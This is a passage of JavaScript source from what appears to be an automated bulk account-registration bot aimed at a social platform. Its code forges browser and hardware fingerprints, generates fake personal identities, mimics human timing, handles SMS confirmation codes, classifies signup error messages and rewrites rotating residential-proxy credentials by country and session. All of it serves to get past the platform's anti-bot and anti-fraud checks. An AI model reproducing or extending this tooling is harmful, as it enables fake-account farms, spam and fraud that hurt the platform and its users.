  ['V2146', 'vivo', 'PD2176', '12'], ['V2225', 'vivo', 'PD2233', '13'],
  ['V2302', 'vivo', 'PD2310', '14'], ['RMX3491', 'realme', 'RMX3491', '12'],
  ['RMX3624', 'realme', 'RMX3624', '13'], ['RMX3760', 'realme', 'RMX3760', '14'],
  ['Infinix X6815', 'Infinix', 'X6815', '12'], ['Infinix X6827', 'Infinix', 'X6827', '13'],
  ['Infinix X6850', 'Infinix', 'X6850', '14'], ['TECNO KJ5', 'TECNO', 'KJ5', '13'],
  ['TECNO KL6', 'TECNO', 'KL6', '13'], ['TECNO KM6', 'TECNO', 'KM6', '14'],
  ['CPH2447', 'OnePlus', 'OP5559L1', '13'], ['CPH2551', 'OnePlus', 'OP5755L1', '14'],
  ['Pixel 6a', 'Google', 'bluejay', '12'], ['Pixel 7', 'Google', 'panther', '13'],
  ['Pixel 8', 'Google', 'shiba', '14'], ['moto g(84)', 'motorola', 'maui', '13'],
  ['Nokia G42', 'HMD Global', 'G42', '13'], ['CRT-NX1', 'HONOR', 'CRT-NX1', '12'],
];

const SCREEN_PROFILES = [
  [360, 640, 2.0], [360, 780, 2.0], [360, 800, 2.0],
  [393, 851, 2.75], [412, 846, 2.625], [412, 915, 2.625],
  [414, 896, 3.0], [428, 926, 3.0], [720, 1560, 2.0],
  [1080, 2340, 2.75], [1080, 2400, 2.75], [1080, 2412, 3.0],
];

const CC_LOCALE_HINTS = {
  '880': { tz: ['Asia/Dhaka', 6], langs: ['en-US,en;q=0.9', 'en-GB,en;q=0.9'] },
  '91': { tz: ['Asia/Kolkata', 5.5], langs: ['en-IN,en;q=0.9', 'en-US,en;q=0.9'] },
  '92': { tz: ['Asia/Karachi', 5], langs: ['en-US,en;q=0.9', 'en-GB,en;q=0.9'] },
  '94': { tz: ['Asia/Colombo', 5.5], langs: ['en-GB,en;q=0.9', 'en-US,en;q=0.9'] },
  '977': { tz: ['Asia/Kathmandu', 5.75], langs: ['en-US,en;q=0.9'] },
  '95': { tz: ['Asia/Yangon', 6.5], langs: ['en-US,en;q=0.9'] },
  '255': { tz: ['Africa/Dar_es_Salaam', 3], langs: ['en-GB,en;q=0.9', 'en-US,en;q=0.9'] },
  '254': { tz: ['Africa/Nairobi', 3], langs: ['en-GB,en;q=0.9', 'en-US,en;q=0.9'] },
  '256': { tz: ['Africa/Kampala', 3], langs: ['en-GB,en;q=0.9', 'en-US,en;q=0.9'] },
  '250': { tz: ['Africa/Kigali', 2], langs: ['en-GB,en;q=0.9', 'fr-FR,fr;q=0.8,en;q=0.7'] },
  '251': { tz: ['Africa/Addis_Ababa', 3], langs: ['en-US,en;q=0.9'] },
  '234': { tz: ['Africa/Lagos', 1], langs: ['en-GB,en;q=0.9', 'en-US,en;q=0.9'] },
  '233': { tz: ['Africa/Accra', 0], langs: ['en-GB,en;q=0.9', 'en-US,en;q=0.9'] },
  '225': { tz: ['Africa/Abidjan', 0], langs: ['fr-FR,fr;q=0.9,en;q=0.8', 'en-US,en;q=0.9'] },
  '221': { tz: ['Africa/Dakar', 0], langs: ['fr-FR,fr;q=0.9,en;q=0.8'] },
  '237': { tz: ['Africa/Douala', 1], langs: ['fr-FR,fr;q=0.9,en;q=0.8'] },
  '212': { tz: ['Africa/Casablanca', 1], langs: ['fr-FR,fr;q=0.9,en;q=0.8'] },
  '213': { tz: ['Africa/Algiers', 1], langs: ['fr-FR,fr;q=0.9,en;q=0.8'] },
  '216': { tz: ['Africa/Tunis', 1], langs: ['fr-FR,fr;q=0.9,en;q=0.8'] },
  '27': { tz: ['Africa/Johannesburg', 2], langs: ['en-ZA,en;q=0.9', 'en-GB,en;q=0.9'] },
  '20': { tz: ['Africa/Cairo', 2], langs: ['en-US,en;q=0.9', 'en-GB,en;q=0.9'] },
  '62': { tz: ['Asia/Jakarta', 7], langs: ['en-US,en;q=0.9', 'id-ID,id;q=0.9,en;q=0.8'] },
  '60': { tz: ['Asia/Kuala_Lumpur', 8], langs: ['en-MY,en;q=0.9', 'en-US,en;q=0.9'] },
  '65': { tz: ['Asia/Singapore', 8], langs: ['en-SG,en;q=0.9', 'en-US,en;q=0.9'] },
  '63': { tz: ['Asia/Manila', 8], langs: ['en-PH,en;q=0.9', 'en-US,en;q=0.9'] },
  '84': { tz: ['Asia/Ho_Chi_Minh', 7], langs: ['en-US,en;q=0.9', 'en-GB,en;q=0.9'] },
  '66': { tz: ['Asia/Bangkok', 7], langs: ['en-US,en;q=0.9', 'en-GB,en;q=0.9'] },
  '855': { tz: ['Asia/Phnom_Penh', 7], langs: ['en-US,en;q=0.9'] },
  '90': { tz: ['Europe/Istanbul', 3], langs: ['tr-TR,tr;q=0.9,en;q=0.8', 'en-US,en;q=0.9'] },
  '966': { tz: ['Asia/Riyadh', 3], langs: ['en-US,en;q=0.9', 'en-GB,en;q=0.9'] },
  '971': { tz: ['Asia/Dubai', 4], langs: ['en-AE,en;q=0.9', 'en-US,en;q=0.9'] },
  '44': { tz: ['Europe/London', 0], langs: ['en-GB,en;q=0.9'] },
  '33': { tz: ['Europe/Paris', 1], langs: ['fr-FR,fr;q=0.9,en;q=0.8', 'en-GB,en;q=0.9'] },
  '49': { tz: ['Europe/Berlin', 1], langs: ['de-DE,de;q=0.9,en;q=0.8', 'en-US,en;q=0.9'] },
  '34': { tz: ['Europe/Madrid', 1], langs: ['es-ES,es;q=0.9,en;q=0.8', 'en-US,en;q=0.9'] },
  '39': { tz: ['Europe/Rome', 1], langs: ['it-IT,it;q=0.9,en;q=0.8', 'en-US,en;q=0.9'] },
  '48': { tz: ['Europe/Warsaw', 1], langs: ['pl-PL,pl;q=0.9,en;q=0.8', 'en-GB,en;q=0.9'] },
  '31': { tz: ['Europe/Amsterdam', 1], langs: ['nl-NL,nl;q=0.9,en;q=0.8', 'en-GB,en;q=0.9'] },
  '380': { tz: ['Europe/Kyiv', 2], langs: ['uk-UA,uk;q=0.9,en;q=0.8', 'en-US,en;q=0.9'] },
  '7': { tz: ['Europe/Moscow', 3], langs: ['ru-RU,ru;q=0.9,en;q=0.8', 'en-US,en;q=0.9'] },
  '55': { tz: ['America/Sao_Paulo', -3], langs: ['pt-BR,pt;q=0.9,en;q=0.8', 'en-US,en;q=0.9'] },
  '52': { tz: ['America/Mexico_City', -6], langs: ['es-MX,es;q=0.9,en;q=0.8', 'en-US,en;q=0.9'] },
  '57': { tz: ['America/Bogota', -5], langs: ['es-CO,es;q=0.9,en;q=0.8', 'en-US,en;q=0.9'] },
  '61': { tz: ['Australia/Sydney', 10], langs: ['en-AU,en;q=0.9'] },
  '1': { tz: ['America/New_York', -5], langs: ['en-US,en;q=0.9'] },
};

const TIMEZONES = [
  ['Asia/Dhaka', 6], ['Asia/Kolkata', 5.5], ['Asia/Karachi', 5],
  ['Asia/Jakarta', 7], ['Asia/Kuala_Lumpur', 8], ['Asia/Manila', 8],
  ['Asia/Bangkok', 7], ['Africa/Lagos', 1], ['Africa/Cairo', 2],
  ['Africa/Nairobi', 3], ['Africa/Dar_es_Salaam', 3], ['Europe/London', 0],
  ['America/New_York', -5],
];

const LANGUAGES = [
  'en-US,en;q=0.9', 'en-GB,en;q=0.9', 'en-IN,en;q=0.9', 'en-PH,en;q=0.9',
];

const ANDROID_VERSIONS = ['10', '11', '12', '13', '14', '15'];
const CHROME_MAJOR_VERSIONS = [125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142];
const BUILD_IDS = ['TP1A', 'TKQ1', 'SQ3A', 'TQ3A', 'UP1A', 'SP1A', 'RP1A', 'RKQ1', 'SKQ1'];
const WEBGL_RENDERERS = [
  ['Adreno (TM) 650', 'Qualcomm'], ['Adreno (TM) 660', 'Qualcomm'],
  ['Adreno (TM) 730', 'Qualcomm'], ['Adreno (TM) 740', 'Qualcomm'],
  ['Mali-G76', 'ARM'], ['Mali-G77', 'ARM'], ['Mali-G78', 'ARM'],
  ['Mali-G710', 'ARM'], ['Mali-G715', 'ARM'],
];

const pickRand = (arr) => arr[Math.floor(Math.random() * arr.length)];
const randInt = (min, max) => min + Math.floor(Math.random() * (max - min + 1));

function buildFingerprint(cc = '') {
  const [model, brand, _buildDev, devAndroid] = pickRand(ANDROID_DEVICES);
  const androidVer = devAndroid || pickRand(ANDROID_VERSIONS);
  const chromeMajor = pickRand(CHROME_MAJOR_VERSIONS);
  const chromeBuild = randInt(5800, 7100);
  const chromePatch = randInt(40, 210);
  const chromeFull = `${chromeMajor}.0.${chromeBuild}.${chromePatch}`;
  const buildId = `${pickRand(BUILD_IDS)}.${randInt(100000, 990000)}.${String(randInt(1, 99)).padStart(3, '0')}`;

  const ua =
    `Mozilla/5.0 (Linux; Android ${androidVer}; ${model} Build/${buildId}; wv) ` +
    `AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 ` +
    `Chrome/${chromeFull} Mobile Safari/537.36`;

  const [sw, sh, dpr] = pickRand(SCREEN_PROFILES);
  const hint = CC_LOCALE_HINTS[String(cc || '').replace(/\D/g, '')];
  const [tzIana, tzOffset] = hint ? hint.tz : pickRand(TIMEZONES);
  const langHeader = hint ? pickRand(hint.langs) : pickRand(LANGUAGES);
  const [glVendor, glVendorFull] = pickRand(WEBGL_RENDERERS);

  const pringer = crypto
    .createHash('sha256')
    .update(`${model}-${sw}x${sh}-${glVendor}-${chromeFull}`)
    .digest('hex')
    .slice(0, 32);

  const navHeaders = {
    'User-Agent': ua,
    Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': langHeader,
    'sec-ch-ua': `"Chromium";v="${chromeMajor}", "Not(A:Brand";v="24", "Android WebView";v="${chromeMajor}"`,
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': `"${model}"`,
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': `"${androidVer}.0.0"`,
    'sec-ch-prefers-color-scheme': Math.random() < 0.5 ? 'light' : 'dark',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-dest': 'document',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    dnt: '1',
    priority: 'u=0, i',
  };

  const xhrHeaders = {
    'User-Agent': ua,
    Accept: '*/*',
    'Accept-Language': langHeader,
    'sec-ch-ua': navHeaders['sec-ch-ua'],
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': `"${model}"`,
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': `"${androidVer}.0.0"`,
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    dnt: '1',
    priority: 'u=1, i',
  };

  return {
    model,
    brand,
    buildId,
    androidVer,
    chromeMajor: String(chromeMajor),
    chromeFull,
    ua,
    sw,
    sh,
    dpr,
    timezone: tzIana,
    tzOffset,
    langHeader,
    glVendor,
    glVendorFull,
    pringer,
    headers: navHeaders,
    xhrHeaders,
  };
}

const HBX_HARDWARE_VENDORS = [
  'Google Inc. (NVIDIA)',
  'Intel Inc.',
  'AMD',
  'Apple Inc.',
];

const HBX_RESOLUTIONS = [
  '1280x800',
  '1366x768',
  '1440x900',
  '1536x864',
  '1920x1080',
  '2560x1440',
];

const HBX_ADVANCED_BROWSER_PROFILES = [
  {
    id: 'android_wv_155',
    label: 'Android WebView 155',
    platform: '"Android"',
    mobile: '?1',
    ua: 'Mozilla/5.0 (Linux; Android 13; SM-A546E Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/155.0.6900.88 Mobile Safari/537.36',
    secChUa: '"Android WebView";v="155", "Chromium";v="155", "Not(A:Brand";v="24"',
    chromeMajor: '155',
  },
  {
    id: 'android_pixel7_148',
    label: 'Android 13 Pixel 7 Chrome 148',
    platform: '"Android"',
    mobile: '?1',
    ua: 'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
    secChUa: '"Chromium";v="148", "Google Chrome";v="148", "Not(A:Brand";v="24"',
    chromeMajor: '148',
  },
  {
    id: 'win_chrome_120',
    label: 'Windows Chrome 120',
    platform: '"Windows"',
    mobile: '?0',
    ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    secChUa: '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    chromeMajor: '120',
  },
  {
    id: 'win_chrome_124',
    label: 'Windows Chrome 124',
    platform: '"Windows"',
    mobile: '?0',
    ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    secChUa: '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
    chromeMajor: '124',
  },
];

function generateRandomMac() {
  const bytes = Array.from({ length: 6 }, (_, i) => {
    let b = Math.floor(Math.random() * 256);
    if (i === 0) b = (b & 0xfe) | 0x02; // locally administered unicast MAC
    return b.toString(16).padStart(2, '0').toUpperCase();
  });
  return bytes.join(':');
}

function generateHbxHardwareFingerprint(seedExtra = '') {
  const macAddress = generateRandomMac();
  const webglVendor = pickRand(HBX_HARDWARE_VENDORS);
  const screenResolution = pickRand(HBX_RESOLUTIONS);
  const canvasHash = crypto.randomBytes(12).toString('hex');
  const hwFp = crypto
    .createHash('sha256')
    .update(`${macAddress}|${webglVendor}|${screenResolution}|${canvasHash}|${seedExtra}`)
    .digest('hex')
    .slice(0, 32);
  return { macAddress, webglVendor, screenResolution, canvasHash, hwFp };
}

function buildHbxFingerprint(cc = '') {
  const base = buildFingerprint(cc);
  const usePreset = Math.random() < 0.65;
  const prof = usePreset ? pickRand(HBX_ADVANCED_BROWSER_PROFILES) : null;
  const hw = generateHbxHardwareFingerprint(prof ? prof.ua : base.ua);
  if (!prof) {
    return {
      ...base,
      profileLabel: `Android ${base.androidVer} ${base.model}`,
      hwFpObj: hw,
    };
  }
  const navHeaders = {
    ...base.headers,
    'User-Agent': prof.ua,
    'sec-ch-ua': prof.secChUa,
    'sec-ch-ua-mobile': prof.mobile,
    'sec-ch-ua-platform': prof.platform,
  };
  const xhrHeaders = {
    ...base.xhrHeaders,
    'User-Agent': prof.ua,
    'sec-ch-ua': prof.secChUa,
    'sec-ch-ua-mobile': prof.mobile,
    'sec-ch-ua-platform': prof.platform,
  };
  if (prof.mobile === '?0') {
    delete navHeaders['sec-ch-ua-model'];
    delete xhrHeaders['sec-ch-ua-model'];
    navHeaders['sec-ch-ua-platform-version'] = '"10.0.0"';
    xhrHeaders['sec-ch-ua-platform-version'] = '"10.0.0"';
  }
  const pringer = crypto
    .createHash('sha256')
    .update(`${prof.id}-${hw.hwFp}-${hw.macAddress}`)
    .digest('hex')
    .slice(0, 32);
  return {
    ...base,
    ua: prof.ua,
    chromeMajor: prof.chromeMajor,
    pringer,
    headers: navHeaders,
    xhrHeaders,
    profileLabel: prof.label,
    hwFpObj: hw,
  };
}

function humanDelayMs(minMs = 420, maxMs = 1150, longPauseChance = 0.1) {
  const u = Math.max(1e-6, Math.random());
  const v = Math.max(1e-6, Math.random());
  const z = Math.sqrt(-2.0 * Math.log(u)) * Math.cos(2.0 * Math.PI * v);
  const mean = (minMs + maxMs) / 2;
  const std = (maxMs - minMs) / 4;
  let ms = Math.round(mean + z * std);
  ms = Math.max(minMs, Math.min(maxMs, ms));
  if (Math.random() < longPauseChance) ms += randInt(600, 1400);
  return ms;
}

function generateIdentity(cc = '') {
  const cleanCc = String(cc || '').replace(/\D/g, '');
  const isF = Math.random() < 0.25; // matches bot.py bias towards higher-approval profiles while staying varied
  const rFirsts = REGION_FIRST_NAMES[cleanCc];
  const rLasts = REGION_LAST_NAMES[cleanCc];
  const first = rFirsts
    ? pickRand(rFirsts)
    : isF
    ? pickRand(FIRST_F)
    : pickRand(FIRST_NAMES_POOL);
  let last = rLasts ? pickRand(rLasts) : pickRand(LAST_N);
  if (Math.random() < 0.2) {
    const last2 = rLasts ? pickRand(rLasts) : pickRand(LAST_N);
    if (last2 !== last) last = `${last} ${last2}`;
  }
  const by = randInt(1995, 2005);
  const bm = randInt(1, 12);
  const maxDay = [1, 3, 5, 7, 8, 10, 12].includes(bm)
    ? 31
    : bm === 2
    ? (by % 4 === 0 && (by % 100 !== 0 || by % 400 === 0) ? 29 : 28)
    : 30;
  const bd = randInt(1, maxDay);
  const sex = isF ? '1' : '2';
  return { first, last, name: `${first} ${last}`, by, bm, bd, sex };
}

const CONFIRM_WORDS = [
  'confirmation code', 'enter the code', 'confirm your phone',
  'confirmphone', 'confirmemail', 'sent you a code', 'confirm your number',
  'confirm your mobile', 'enter the 5-digit code', 'code sent to',
];

const WRONG_CODE_WORDS = [
  'incorrect', 'wrong', 'invalid code', "doesn't match",
  "didn't match", 'not valid', 'expired', 'try entering the code again',
];

// Carefully phrased so signup-page "Already have an account?" login link NEVER false-triggers
const ERR_WORDS = [
  ['already registered', 'USED'],
  ['already an account associated', 'USED'],
  ['existing account associated', 'USED'],
  ['already been registered', 'USED'],
  ['already been used', 'USED'],
  ['already taken', 'USED'],
  ['phone number you entered is already', 'USED'],
  ['already has an account', 'USED'],
  ['there is an existing account', 'USED'],
  ['too many', 'LIMIT'],
  ['try again later', 'LIMIT'],
  ['reached the limit', 'LIMIT'],
  ['temporarily blocked', 'LIMIT'],
  ['valid phone', 'BADNUM'],
  ['valid number', 'BADNUM'],
  ['valid mobile', 'BADNUM'],
  ['different number', 'BADNUM'],
  ['please enter a valid', 'BADNUM'],
  ["isn't valid", 'BADNUM'],
  ['invalid number', 'BADNUM'],
  ['not a valid', 'BADNUM'],
  ["couldn't create your account", 'FAIL'],
  ["wasn't created", 'FAIL'],
  ['please choose a password', 'FAIL'],
];

const OTP_FIELDS = ['code', 'sms_code', 'pin', 'approvals_code', 'c', 'n'];
const SKIP_HINTS = ['skip', 'not now', 'not, now', 'later', 'remind me'];

const LITE_UA =
  'Mozilla/5.0 (Linux; Android 13; SM-A546E Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36';
const DESKTOP_UA =
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';

const COOKIE_ORDER = ['datr', 'sb', 'm_pixel_ratio', 'wd', 'c_user', 'fr', 'xs'];

function orderCookies(jar) {
  const out = {};
  for (const k of COOKIE_ORDER) {
    if (jar && jar[k] !== undefined && jar[k] !== '') out[k] = jar[k];
  }
  for (const [k, v] of Object.entries(jar || {})) {
    if (!COOKIE_ORDER.includes(k) && v !== undefined && v !== '') out[k] = v;
  }
  return out;
}

function formatCookieHeader(jar) {
  return Object.entries(orderCookies(jar))
    .map(([k, v]) => `${k}=${v}`)
    .join('; ');
}

function randTok(bytes = 8) {
  return crypto.randomBytes(bytes).toString('base64url');
}

function freshSb() {
  return `${randTok(8)}-${randTok(6)}`;
}

function printerId() {
  return crypto.randomBytes(16).toString('hex');
}

function jazoest(lsd) {
  if (!lsd) return DEFAULT_GQL_JAZOEST;
  let sum = 0;
  for (let i = 0; i < lsd.length; i++) {
    sum += lsd.charCodeAt(i);
  }
  return `2${sum}`;
}

async function sleepAbort(ms, shouldAbort) {
  const end = Date.now() + Math.max(0, ms);
  while (Date.now() < end) {
    if (shouldAbort && shouldAbort()) return false;
    await new Promise((r) => setTimeout(r, Math.min(250, Math.max(10, end - Date.now()))));
  }
  return true;
}

function appendDebugLog(msg) {
  const ts = new Date().toISOString().replace('T', ' ').slice(0, 19);
  const line = `[${ts}] ${msg}`;
  try {
    fs.appendFileSync(FILES.debugLog, line + '\n', 'utf-8');
  } catch {
    // ignore
  }
  return line;
}

async function checkCurlAvailable() {
  return new Promise((resolve) => {
    try {
      const child = spawn('curl', ['--version'], { shell: false });
      const chunks = [];
      child.stdout.on('data', (c) => chunks.push(c));
      child.on('error', () => resolve({ ok: false, version: 'missing' }));
      child.on('close', (code) => {
        const firstLine = Buffer.concat(chunks).toString('utf-8').split(/\r?\n/)[0] || '';
        resolve({ ok: code === 0, version: firstLine.trim() || (code === 0 ? 'ok' : 'missing') });
      });
    } catch {
      resolve({ ok: false, version: 'missing' });
    }
  });
}

function escapeHtml(s) {
  return String(s || '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

function csvCell(val) {
  const s = String(val ?? '');
  const safe = /^[=+\-@\t\r]/.test(s) ? `'${s}` : s;
  return `"${safe.replace(/"/g, '""')}"`;
}

// ----------------------------------------------------------------------------
// 3. Proxy Parsing, Health Scoring, Rotation, Probing & HTTP/2 Curl Transport
// ----------------------------------------------------------------------------
const proxyHealth = new Map();
const dynamicProxyTagBlacklist = new Set();

function randomSessionToken(len = 10) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  const bytes = crypto.randomBytes(len);
  let out = '';
  for (let i = 0; i < len; i++) {
    out += chars[bytes[i] % chars.length];
  }
  return out;
}

function proxyHealthKey(proxyUrl) {
  if (!proxyUrl) return '';
  try {
    const u = new URL(proxyUrl);
    if (u.username) {
      const dec = decodeURIComponent(u.username)
        .replace(/([_-](?:ssid|session|sessid|ses|sid|sticky)[_-])[A-Za-z0-9]{1,32}/gi, '$1*')
        .replace(/([_-](?:country|cc|region|cnt)[_-])[a-zA-Z]{2}/gi, '$1*')
        .replace(/(__cr\.)[a-zA-Z]{2}/gi, '$1*')
        .replace(/[_-]city[_-][A-Za-z0-9_]+(?=[_-]|$)/gi, '')
        .replace(/([_-]sst[_-])\d+/gi, '$1*');
      return `${u.protocol}//${dec}@${u.host}`;
    }
    return `${u.protocol}//${u.host}`;
  } catch {
    return String(proxyUrl);
  }
}

const KNOWN_ROTATING_PROXY_HOSTS = [
  'niceproxy', '9proxy', 'iproyal', 'oxylabs', 'brightdata', 'superproxy',
  'lunaproxy', 'smartproxy', 'decodo', 'abcproxy', 'pyproxy', '360proxy',
  'tabproxy', 'piaproxy', 'packetstream', 'soax', 'geonode', 'dataimpulse',
  'proxy-seller', 'proxycheap', 'lightningproxies', 'nodemaven', 'proxyempire',
  'floxy', 'cherryproxy', 'resproxy', 'mobileproxy',
];

function inspectProxyCapabilities(proxyUrl) {
  const out = {
    hasCountryTag: false,
    countryCode: '',
    hasCityTag: false,
    city: '',
    hasSessionTag: false,
    sessionId: '',
    hasSst: false,
    sst: '',
    isNiceProxy: false,
    isRotatingGateway: false,
  };
  if (!proxyUrl) return out;
  try {
    const u = new URL(proxyUrl);
    const hostLow = (u.hostname || '').toLowerCase();
    out.isNiceProxy = hostLow.includes('niceproxy') || hostLow.includes('9proxy');
    const user = decodeURIComponent(u.username || '');
    const mc =
      user.match(/[_-](?:country|cc|region|cnt)[_-]([a-zA-Z]{2})(?=[_-]|$)/i) ||
      user.match(/(?:country|cc|region)[=:]([a-zA-Z]{2})(?=[;&,\-_]|$)/i) ||
      user.match(/__cr\.([a-zA-Z]{2})(?=[._;\-]|$)/i);
    if (mc) {
      out.hasCountryTag = true;
      out.countryCode = mc[1].toUpperCase();
    }
    const mcity = user.match(/[_-]city[_-]([A-Za-z0-9_]+)(?=[_-]|$)/i) || user.match(/city[=:]([A-Za-z0-9_]+)(?=[;&,\-_]|$)/i);
    if (mcity) {
      out.hasCityTag = true;
      out.city = mcity[1];
    }
    const ms =
      user.match(/[_-](?:ssid|session|sessid|ses|sid|sticky)[_-]([A-Za-z0-9]{1,32})(?=[_-]|$)/i) ||
      user.match(/(?:ssid|session|sessid|ses|sid|sticky)[=:]([A-Za-z0-9]{1,32})(?=[;&,\-_]|$)/i);
    if (ms) {
      out.hasSessionTag = true;
      out.sessionId = ms[1];
    }
    const msst = user.match(/[_-]sst[_-](\d+)(?=[_-]|$)/i);
    if (msst) {
      out.hasSst = true;
      out.sst = msst[1];
    }
    out.isRotatingGateway =
      KNOWN_ROTATING_PROXY_HOSTS.some((h) => hostLow.includes(h)) ||
      out.hasCountryTag ||
      out.hasSessionTag ||
      out.hasCityTag ||
      out.hasSst ||
      /([_-](?:zone|state|life|lifetime|res|mobile|asn)[_-]|\{(?:iso|country|ssid|session)\})/i.test(user);
  } catch {
    // ignore
  }
  return out;
}

function adaptProxyForSession(proxyUrl, opts = {}) {
  const raw = String(proxyUrl || '').trim();
  if (!raw) {
    return {
      url: null,
      isoApplied: '',
      sessionId: '',
      countryChanged: false,
      sessionRefreshed: false,
      cityCleared: false,
      countryInjected: false,
      sessionInjected: false,
    };
  }
  if (dynamicProxyTagBlacklist.has(proxyHealthKey(raw)) && !opts.forceDynamicTags) {
    return {
      url: raw,
      isoApplied: '',
      sessionId: '',
      countryChanged: false,
      sessionRefreshed: false,
      cityCleared: false,
      countryInjected: false,
      sessionInjected: false,
    };
  }
  try {
    const u = new URL(raw);
    let user = decodeURIComponent(u.username || '');
    const origUser = user;
    const origCap = inspectProxyCapabilities(raw);
    const hostLow = (u.hostname || '').toLowerCase();
    const targetIsoUpper = String(opts.iso || '').trim().toUpperCase();
    const targetIso = targetIsoUpper.toLowerCase();
    let isoApplied = '';
    let sessionId = '';
    let countryChanged = false;
    let sessionRefreshed = false;
    let cityCleared = false;
    let countryInjected = false;
    let sessionInjected = false;

    const isoForTok = /^[a-z]{2}$/.test(targetIso) ? targetIso : (origCap.countryCode || '').toLowerCase().slice(0, 2);
    const nextTok = opts.forcedSessionId || `${isoForTok}${randomSessionToken(isoForTok ? 8 : 10)}`;

    // Placeholder syntax support: e.g. user-country-{iso}-ssid-{ssid}
    if (user && /\{(?:iso|cc|country|ssid|session|rnd)\}/i.test(user)) {
      if (/^[a-z]{2}$/.test(targetIso)) {
        user = user
          .replace(/\{iso\}|\{cc\}|\{country\}/g, targetIso)
          .replace(/\{ISO\}|\{CC\}|\{COUNTRY\}/g, targetIsoUpper);
        isoApplied = targetIsoUpper;
        countryChanged = true;
      }
      if (/\{(?:ssid|session|rnd)\}/i.test(user)) {
        user = user.replace(/\{(?:ssid|session|rnd)\}/gi, nextTok);
        sessionId = nextTok;
        sessionRefreshed = true;
      }
    }

    if (opts.autoCountry !== false && /^[a-z]{2}$/.test(targetIso) && user) {
      const prevIsoUpper = origCap.countryCode || '';
      const actuallyDifferent = !prevIsoUpper || prevIsoUpper !== targetIsoUpper;

      const next1 = user.replace(
        /([_-](?:country|cc|region|cnt)[_-])([a-zA-Z]{2})(?=[_-]|$)/gi,
        (_, p1, prevCode) => `${p1}${prevCode === prevCode.toUpperCase() ? targetIsoUpper : targetIso}`
      );
      const next2 = next1.replace(
        /((?:country|cc|region)[=:])([a-zA-Z]{2})(?=[;&,\-_]|$)/gi,
        (_, p1, prevCode) => `${p1}${prevCode === prevCode.toUpperCase() ? targetIsoUpper : targetIso}`
      );
      const next3 = next2.replace(
        /(__cr\.)([a-zA-Z]{2})(?=[._;\-]|$)/gi,
        (_, p1, prevCode) => `${p1}${prevCode === prevCode.toUpperCase() ? targetIsoUpper : targetIso}`
      );
      if (next3 !== user) {
        user = next3;
        isoApplied = targetIsoUpper;
        countryChanged = actuallyDifferent;
      } else if (!/country|__cr\.|-cc-|_cc-|-region-/i.test(user)) {
        const allowInject = origCap.isRotatingGateway || opts.allowGenericInject !== false;
        if (allowInject) {
          if (hostLow.includes('dataimpulse')) {
            user = `${user}__cr.${targetIso}`;
          } else if (hostLow.includes('iproyal') || (/_(?:session|lifetime|city)[_-]/i.test(user) && !/-/.test(user))) {
            user = /([_-](?:ssid|session|sessid|ses|sid|sticky)[_-])/i.test(user)
              ? user.replace(/([_-](?:ssid|session|sessid|ses|sid|sticky)[_-])/i, `_country-${targetIso}$1`)
              : `${user}_country-${targetIso}`;
          } else if (/([_-](?:ssid|session|sessid|ses|sid|sticky)[_-])/i.test(user)) {
            user = user.replace(/([_-](?:ssid|session|sessid|ses|sid|sticky)[_-])/i, `-country-${targetIso}$1`);
          } else {
            user = `${user}-country-${targetIso}`;
          }
          isoApplied = targetIsoUpper;
          countryChanged = true;
          countryInjected = !origCap.isNiceProxy && !origCap.isRotatingGateway;
        }
      }

      // CRITICAL: Country and city must match for 9Proxy/NiceProxy to succeed!
      // If country switched and no city override for that country was provided, remove mismatched -city-xxx tag.
      if (actuallyDifferent && !opts.city && origCap.hasCityTag) {
        const strippedCity = user
          .replace(/([_-])city[_-][A-Za-z0-9_]+(?=[_-]|$)/gi, '')
          .replace(/(?:^|[;&,])city[=:][A-Za-z0-9_]+/gi, '');
        if (strippedCity !== user) {
          user = strippedCity;
          cityCleared = true;
        }
      }
      if (opts.city) {
        const cleanCity = String(opts.city).trim().toLowerCase().replace(/[^a-z0-9_]/g, '');
        if (cleanCity) {
          if (/[_-]city[_-][A-Za-z0-9_]+/i.test(user)) {
            user = user.replace(/([_-]city[_-])[A-Za-z0-9_]+/i, `$1${cleanCity}`);
          } else if (/([_-](?:country|cc)[_-][a-z]{2})/i.test(user)) {
            user = user.replace(/([_-](?:country|cc)[_-][a-z]{2})/i, `$1-city-${cleanCity}`);
          }
        }
      }
    }

    if (opts.refreshSession && user) {
      const next1 = user.replace(/([_-](?:ssid|session|sessid|ses|sid|sticky)[_-])([A-Za-z0-9]{1,32})(?=[_-]|$)/gi, (_, p1) => `${p1}${nextTok}`);
      const next2 = next1.replace(/((?:ssid|session|sessid|ses|sid|sticky)[=:])([A-Za-z0-9]{1,32})(?=[;&,\-_]|$)/gi, (_, p1) => `${p1}${nextTok}`);
      if (next2 !== next1 || next1 !== user) {
